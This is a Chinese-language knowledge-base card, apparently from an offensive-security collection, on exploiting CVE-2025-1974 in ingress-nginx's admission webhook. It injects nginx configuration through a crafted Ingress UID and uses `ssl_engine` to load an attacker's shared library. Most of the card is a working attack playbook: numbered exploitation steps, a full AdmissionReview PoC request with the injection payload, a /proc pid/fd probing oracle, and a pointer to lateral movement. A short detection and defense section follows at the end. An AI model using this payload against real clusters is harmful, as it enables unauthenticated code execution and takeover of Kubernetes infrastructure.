---
id: cloud-k8s-ingress-nginx-mirror-uid-config-injection
title: ingress-nginx Admission Webhook 借 mirror 注解与 Ingress UID 注入 nginx 配置，ssl_engine 加载 .so 实现 RCE
type: scenario
domain: cloud
path: cloud/k8s
technique: nginx-template-config-injection
tags:
- kubernetes
- ingress-nginx
- config-injection
- admission-webhook
- nginx
- rce
- cve
cve:
- CVE-2025-1974
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-18
  verified_at: '2026-11-08T12:12:57+08:00'
  notes: 已对照原文核对：img09 mirror.Parse 中 Source=fmt.Sprintf("/_mirror-%v", ing.UID) UID 无引号拼接、img10 uid 注入 payload、img11 注入后 nginx 配置中确实出现 ssl_engine testxxx 与 init_by_lua_block {#、img12/13 通过 ENGINE_by_id 报错差异形成 /proc 文件存在性 oracle（Exec format error vs No such file or directory），注入与 oracle 均有实证。CVE 标注判断：原文正文只明示 CVE-2025-24513（文中已放弃）及 IngressNightmare 系列前篇链接，未直接写 CVE-2025-1974；该编号系卡作者按公开对应关系（mirror-target/uid admission 配置注入即 CVE-2025-1974 的公开利用面）补充，归类客观正确、非虚构，判定不越界，保留。confidence medium 恰当：注入与 oracle 有实证非纯理论，但最终 ssl_engine 加载 .so 的 RCE 无端到端回显，不降 low 也不删除。dedup：spec-path 卡判 related（注入字段/入口/利用方式不同），dedup_review 成立；dup-scan 无涉及 pair。未验证点：RCE 最后一公里（so 加载执行）未演示。
url: /docs/cloud/k8s/cloud-k8s-ingress-nginx-mirror-uid-config-injection/
draft: false
kb_aliases:
- IngressNightmare mirror 注入
- CVE-2025-1974
- mirror-target 注解注入
- ingress-nginx uid 注入
- ssl_engine 加载恶意 so
- IngressNightmareV2
---

## 一句话结论

ingress-nginx 的 admission webhook 在 dryRun 阶段就会解析 Ingress 注解并生成 nginx 配置：只要给 Ingress 加上 `nginx.ingress.kubernetes.io/mirror-target`，模板就会输出一行未加引号的 `mirror /_mirror-<metadata.uid>;`，把 UID 换成 `…#;\n}\n}\n}\nssl_engine …` 即可闭合指令与 server/http 块，向 nginx.conf 注入 `ssl_engine` 指令，让 worker 进程 `dlopen()` 攻击者上传的共享库，形成集群内的代码执行。

## 原理

整条链是“注解开关 + 模板拼接 + 指令语义”三段：

1. **入口**：admission webhook 的 `/mutate` 接收 `AdmissionReview`，`ServeHTTP` 直接 `io.ReadAll(req.Body)` 后 `codec.Decode`，不校验来源与内容，然后 `HandleAdmission` → `CheckIngress` → `annotations.NewAnnotationExtractor(store).Extract(ing)`。也就是说，只要能把请求打到 webhook（集群内任意 Pod、或暴露到外部的 8888 端口），就能驱动它对任意构造的 Ingress 对象做完整注解解析。
2. **注入点**：mirror 注解解析器里 `Source: fmt.Sprintf("/_mirror-%v", ing.UID)`。UID 由请求体 `metadata.uid` 完全控制，且 `nginx.tmpl` 输出时是 `mirror /_mirror-{{ $ing.UID }};` 这种无引号形式。`uid` 里的 `#` 会把该行剩余部分（含结尾 `;`）注释掉，`\n` + `}` 则逐层关闭 `location`/`server`/`http` 块，之后的内容就成为顶层指令——这是“注释符收尾 + 花括号逃逸”的标准配置注入手法。
3. **落地为 RCE**：注入 `ssl_engine /path/to/x.so;` 后，nginx 在启动/重载 worker 时会 `dlopen` 该共享库并调用其 `ngx_ssl_engine` 相关符号；`.so` 的构造函数先于任何符号解析执行，等价于任意代码执行。指向 `/proc/<pid>/fd/<n>` 还能绕过“文件落在未知临时目录”的问题——把 .so 通过 nginx 的临时文件缓存机制落盘，再用 pid/fd 路径引用。

为什么 dryRun 也有效：admission webhook 是“准入检查”而非“实际写入”，`dryRun: true` 只影响 apiserver 是否持久化对象，webhook 仍然完整执行配置生成与 `nginx -t` 校验，因此攻击者不需要真正创建 Ingress，也不会在集群里留下对象痕迹；校验失败的报错信息还会通过 `AdmissionResponse.status.message` 原样返回，成为盲测文件存在性的 oracle。

## 触发条件

- 目标集群部署 ingress-nginx，且其 admission webhook 可达（集群内任意 Pod 可访问 `ingress-nginx-controller-admission` Service；或 controller 的 webhook 端口被暴露）；
- 攻击者能构造并发送 `AdmissionReview` JSON（无需 K8s 凭据，只要能发 HTTP）；
- 版本处于 IngressNightmare 影响范围（admission webhook 默认开启且未升级到修复版本）；
- 需要一个能把 .so 落到 nginx 容器可读路径的通道（同链其它注入点或临时文件缓存）。

## 利用步骤

1. 探测 webhook：向 `https://<controller>:443/mutate`（或暴露的 8888 端口）POST 一个合法 `AdmissionReview`，观察是否返回 `allowed` 与 `status`；
2. 在 `object.metadata.annotations` 加上 `nginx.ingress.kubernetes.io/mirror-target: xxxxxxxxx`（值随意，作用是让模板生成 mirror 行），把 `object.metadata.uid` 设为注入串；
3. 先用最小 payload 验证注入是否生效：`uid = "test#;\n\n}\n}\n}\nssl_engine ../../../../../../proc/1/cmdline"`；
4. 读响应 `message` 里的 `nginx -t` 报错：`Exec format error` 表示该路径存在但不是 ELF 共享库（说明注入成功且文件存在），`No such file or directory` 表示路径不存在——用这个差异判断 `uid` 注入是否被模板正确渲染，以及探测容器内路径；
5. 把 .so 投放到 nginx 容器（利用同链的临时文件写入或镜像内可写目录），再用同一 oracle 遍历 `/proc/<pid>/cmdline`、`/proc/<pid>/fd/<n>`，区分“存在但格式错误”与“不存在”，定位 worker 进程与持有 .so 的 fd；
6. 命中后 `ssl_engine` 指向该 fd 路径，触发重载，worker 加载 .so 执行代码；
7. 为提高命中率可多线程并发探测 pid/fd（原文 PoC 即按此优化，脚本名 IngressNightmareV2）。

## PoC

最小注入请求（`dryRun: true`，不需要真实创建 Ingress）：

```http
POST /mutate HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: application/json

{
  "kind": "AdmissionReview",
  "apiVersion": "admission.k8s.io/v1",
  "request": {
    "uid": "test2",
    "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
    "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
    "requestKind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
    "requestResource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
    "name": "minimal-ingress",
    "namespace": "default",
    "operation": "CREATE",
    "userInfo": {"uid": "1619bf32-d4cb-4a99-a4a4-d33b2efa3bc6"},
    "object": {
      "kind": "Ingress",
      "apiVersion": "networking.k8s.io/v1",
      "metadata": {
        "name": "minimal-ingress",
        "namespace": "default",
        "creationTimestamp": null,
        "uid": "test#;\n\n}\n}\n}\nssl_engine ../../../../../../tmp/pwn.so",
        "annotations": {
          "nginx.ingress.kubernetes.io/mirror-target": "xxxxxxxxxxx"
        }
      },
      "spec": {
        "ingressClassName": "nginx",
        "rules": [{
          "host": "test.example.com",
          "http": {"paths": [{
            "path": "/",
            "pathType": "Prefix",
            "backend": {"service": {"name": "kubernetes", "port": {"number": 443}}}
          }]}
        }]
      },
      "status": {"loadBalancer": {}}
    },
    "oldObject": null,
    "dryRun": true,
    "options": {"kind": "CreateOptions", "apiVersion": "meta.k8s.io/v1"}
  }
}
```

生成的 nginx.conf 片段（注入点位于 location 内）：

```nginx
location / {
    ...
    mirror /_mirror-test#;        # UID 中的 # 注释掉本行剩余部分
}                                 
}                                 # 逐层闭合
}                                 
ssl_engine ../../../../../../tmp/pwn.so;
}
...
location / { ... }
ssl_engine testxxx;               # 合法指令回显，证明模板已被污染
```

存在性 oracle（两种响应差异）：

```
# 路径存在但非共享库
[e...] SSL: error:12800067:DSO support routines:could not load the shared library:filename(/usr/lib/engines-3/../../../../../../proc/1/cmdline): Error loading shared library ...: Exec format error

# 路径不存在
[e...] ... filename(/usr/lib/engines-3/../../../../../../proc/999/cmdline): No such file or directory
```

## 变体与关联

- **注解变体**：除 `mirror-target`，同系列还有 `auth-url`、`auth-secret` 等注解可触发同类模板拼接，但原文实测 `auth-url` 不如 mirror 通用（正常 URL 会在两处渲染，闭合困难）；
- **路径截断变体（已排除）**：`auth-secret-type: auth-file` 会把 secret 写到 `%v/%v-%v-%v.passwd`，后缀固定且内容只取 secret 的 `auth` 键，想靠超长路径截断去掉 `.passwd` 在 Go 中不可行（`os.WriteFile` 直接走 `open(2)`，超长返回 ENAMETOOLONG，不做截断）；PHP 的 MAXPATHLEN 截断只在 < 5.2.8 的 `php_fopen_with_path` 中存在（`snprintf(trypath, MAXPATHLEN, ...)`），现代 PHP/Java 还会用 `strlen(filename) != filename_len` 拒绝 `\0`，Go 的 `syscall.ByteSliceFromString` 同样检测 NUL 直接返回 EINVAL——因此 CVE-2025-24513 这条目录穿越只到 DoS/有限 secret 泄露，不足以作为写文件原语；
- **关联**：同目录 `cloud-k8s-ingress-nginx-spec-path-quote-config-injection`（CVE-2026-3288）是同一模板层的另一处注入；`code-analysis/static/source-audit` 的 `Sprintf 拼 nginx/VCL 配置` 卡是本类漏洞的通用审计视角；
- **关联**：获取到集群内代码执行后，可结合 `cloud-k8s-k8s-pod-sa-token-rbac-enumeration` 用 SA token 横向。

## 检测与防御

- **升级**：ingress-nginx 升级到修复 IngressNightmare 的版本；确认 admission webhook 默认开启状态下的补丁已生效；
- **收敛 webhook 暴露面**：admission Service 只允许 apiserver 访问（NetworkPolicy 限制来源为控制面网段），不要把 8888/8443 暴露到集群外；
- **模板输出转义**：nginx.tmpl 中所有来自对象的字段（UID、name、namespace、annotation 值）必须加引号或做 nginx 语法转义，禁止裸拼；
- **检测**：审计 Ingress 对象中 `metadata.uid` 不可由用户设置（正常创建时由 apiserver 生成），若出现 `#`、`}`、`ssl_engine`、`init_by_lua_block` 等字样即为攻击特征；监控 webhook 的 `/mutate` 请求体中的换行与花括号注入；对 nginx 配置出现非预期 `ssl_engine` 指令、worker 加载非镜像内 .so 的行为告警；
- **运行层**：以只读根文件系统、非 root 运行 controller，限制 `/tmp` 写入，可显著降低 .so 落地成功率。
